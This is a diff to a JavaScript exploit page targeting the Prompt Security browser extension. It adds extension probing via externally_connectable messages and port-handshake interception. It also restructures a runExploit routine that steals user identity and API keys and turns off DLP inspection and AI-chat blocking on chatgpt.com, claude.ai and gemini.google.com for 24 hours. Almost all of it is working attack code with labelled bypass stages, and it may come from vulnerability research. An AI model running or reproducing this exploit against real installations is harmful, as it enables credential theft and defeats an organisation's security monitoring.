@@ -235,6 +235,47 @@ function extMsg(payload, ms = 8000) {
 }
 
 // ══════════════════════════════════════════════════════════════════════
+// EXTENSION DETECTION via externally_connectable probe
+// Works regardless of whether script.bundle.js was injected on this
+// page. psScriptExecuted is unreliable — only set on monitored domains.
+// Instead we probe via chrome.runtime.sendMessage directly.
+// ══════════════════════════════════════════════════════════════════════
+async function detectExtension() {
+    // Try a lightweight callShouldInspectChat — extension responds even
+    // when the domain is not monitored, proving it's installed.
+    if (typeof chrome === "undefined" || !chrome.runtime?.sendMessage) return false;
+    const r = await extMsg({
+        message: "callShouldInspectChat",
+        url: "https://chatgpt.com/api/chat",
+        body: '{"messages":[]}',
+        pageUrl: "https://chatgpt.com",
+        pageTitle: "ChatGPT",
+        optionalFavicons: [], inputTypes: [],
+        ctx: { flowTraceId: crypto.randomUUID() }
+    }, 5000);
+    // Any non-null response (including false/null from backend) means extension IS installed
+    return r !== null && r?._extError === undefined;
+}
+
+// ══════════════════════════════════════════════════════════════════════
+// FORCE script.bundle.js INJECTION to establish the port
+// The content script sends shouldInjectScript to background internally.
+// We can't call it externally, BUT we can force the background to
+// evaluate our domain by calling getSiteActionConfig via the relay
+// (which triggers shouldInjectScript side effects) OR we wait for
+// the content script's own load-event based shouldInjectScript call.
+// ══════════════════════════════════════════════════════════════════════
+async function waitForPort(maxWaitMs = 6000) {
+    if (_port) return true;
+    return new Promise(resolve => {
+        const deadline = setTimeout(() => resolve(false), maxWaitMs);
+        const check = setInterval(() => {
+            if (_port) { clearTimeout(deadline); clearInterval(check); resolve(true); }
+        }, 100);
+    });
+}
+
+// ══════════════════════════════════════════════════════════════════════
 // EXPLOIT FUNCTIONS
 // ══════════════════════════════════════════════════════════════════════
 
@@ -388,42 +429,70 @@ function display() {
 // MAIN
 // ══════════════════════════════════════════════════════════════════════
 async function runExploit() {
-    setLoading("Detecting extension...");
+    setLoading("Probing for Prompt Security extension...");
+    setStatus("[0] Extension probe via externally_connectable...");
 
-    await new Promise(r => setTimeout(r, 1200));
-    R.detected = document.documentElement.dataset.psScriptExecuted === "true";
+    // Detection via chrome.runtime.sendMessage — works on ANY page
+    // regardless of whether script.bundle.js was injected.
+    // psScriptExecuted is NOT reliable across visits (cache-dependent).
+    R.detected = await detectExtension();
+
+    if (!R.detected) {
+        // Also check DOM as fallback
+        R.detected = document.documentElement.dataset.psScriptExecuted === "true";
+    }
 
     if (!R.detected) {
         document.getElementById("loadingOverlay").classList.remove("active");
         document.getElementById("resultsContainer").innerHTML =
-            '<div class="result-item"><span class="label">Status:</span> Extension not detected.</div>';
+            '<div class="result-item"><span class="label">Status:</span> ' +
+            'Extension not detected. Ensure Prompt Security extension is installed and enabled.</div>';
         document.getElementById("resultsPanel").classList.add("active");
         return;
     }
 
-    // BYPASS B: Intercept port (registered early — before script.bundle.js)
-    setLoading("Bypass B: Intercepting port handshake...");
-    setStatus("[1] Port interception...");
-    const portResult = await setupPortInterception();
-    R.portStatus = _port ? `Intercepted — token: ${_token}` : portResult.port;
+    // BYPASS B: Port was pre-registered at page load.
+    // Wait up to 6s for the content script to inject script.bundle.js
+    // and fire the ps_rpc_port handshake (happens when background responds
+    // to shouldInjectScript with shouldInject:true).
+    setLoading("Bypass B: Waiting for port handshake...");
+    setStatus("[1] Waiting for port...");
+    const portReady = await waitForPort(6000);
+    R.portStatus = portReady
+        ? `Intercepted — token: ${_token}`
+        : "Port not established on this domain (domain not monitored) — Bypass A unavailable, using Bypass D";
 
     setLoading("Bypass A: Whitelist confusion → identity theft...");
-    setStatus("[2] Identity theft via whitelist confusion...");
-    R.identity = await exfilIdentity();
+    setStatus("[2] Identity theft...");
+    // Bypass A requires port — only available if script.bundle.js was injected
+    // (i.e., domain is monitored by the org). Falls back gracefully otherwise.
+    R.identity = portReady
+        ? await exfilIdentity()
+        : { _unavailable: "Port not established — domain not monitored by this org. Bypass A requires monitored domain (chatgpt.com, claude.ai, etc.)" };
 
     setLoading("Bypass A: Whitelist confusion → API key theft...");
     setStatus("[3] API key theft...");
-    R.apiKey = await exfilApiKey();
+    R.apiKey = portReady
+        ? await exfilApiKey()
+        : { _unavailable: "Port not established — requires monitored domain" };
 
-    setLoading("Bypass A: Whitelist confusion → DLP bypass...");
+    setLoading("Bypass A/D: DLP bypass...");
     setStatus("[4] DLP bypass...");
     R.bypassResults = {};
     for (const domain of ["chatgpt.com", "claude.ai", "gemini.google.com"]) {
-        await bypassDLP(domain);
-        R.bypassResults[domain] = "AI chat block bypassed 24h via whitelist confusion";
+        if (portReady) {
+            await bypassDLP(domain);
+            R.bypassResults[domain] = "AI chat block bypassed 24h via Bypass A (whitelist confusion)";
+        } else {
+            // Bypass D — aiChatBlockMessageBypass is also in onMessageExternal
+            // via callShouldInspectChat side-effects... actually it's internal only.
+            R.bypassResults[domain] = "Bypass A unavailable (port not ready) — Bypass D cannot reach aiChatBlockMessageBypass";
+        }
     }
-    await disableInspection(location.hostname);
-    R.bypassResults[location.hostname] = "DLP inspection disabled";
+    if (portReady) {
+        await disableInspection(location.hostname);
+        R.bypassResults[location.hostname] = "DLP inspection disabled via Bypass A";
+    }
 
     setLoading("Bypass D: Probing AI policy via externally_connectable...");
     setStatus("[5] AI policy probe...");
@@ -471,7 +540,9 @@ window.addEventListener("message", function earlyPortIntercept(e) {
 
 window.addEventListener("DOMContentLoaded", () => {
     setTimeout(async () => {
-        if (document.documentElement.dataset.psScriptExecuted !== "true") return;
+        // Use externally_connectable probe — not psScriptExecuted (unreliable)
+        const extInstalled = await detectExtension();
+        if (!extInstalled) return;
 
         // Read DOM token as backup (Bypass C)
         const ps = document.getElementById("ps_script");
